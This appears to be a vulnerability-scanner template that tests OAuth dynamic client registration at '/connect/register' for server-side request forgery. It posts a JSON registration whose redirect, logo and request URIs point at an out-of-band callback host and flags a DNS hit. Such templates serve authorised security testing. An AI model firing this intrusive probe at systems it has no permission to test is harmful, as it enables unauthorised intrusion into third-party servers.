id: ssrf-via-oauth-misconfig
brief:
    title: SSRF due to misconfiguration in OAuth
    by: KabirSuda
    level: medium
    about: Sends a POST request with the endpoint "/connect/register" to check external Interaction with multiple POST parameters.
    label:
        - misconfig
        - oast
        - oauth
        - ssrf
        - intrusive
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/connect/register'
      head:
        Accept-Language: en-US,en;q=0.9
        Content-Type: application/json
      body: |-
        {
          "application_type": "web",
          "redirect_uris": ["https://{{interactsh-url}}/callback"],
          "client_name": "{{Hostname}}",
          "logo_uri": "https://{{interactsh-url}}/favicon.ico",
          "subject_type": "pairwise",
          "token_endpoint_auth_method": "client_secret_basic",
          "request_uris": ["https://{{interactsh-url}}"]
        }
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
